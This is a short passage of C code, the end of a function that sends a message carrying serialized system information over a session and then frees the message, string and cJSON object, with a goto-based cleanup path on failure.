	if (!message_send(sess, msg)) goto fail;

	// free resources	
	message_free(msg);
	FREE(str_sysinfo);
	cJSON_Delete(system_info);
	return true;

fail:
	if (system_info) cJSON_Delete(system_info);
	if (msg) message_free(msg);
	FREE(str_sysinfo);
	return false;
}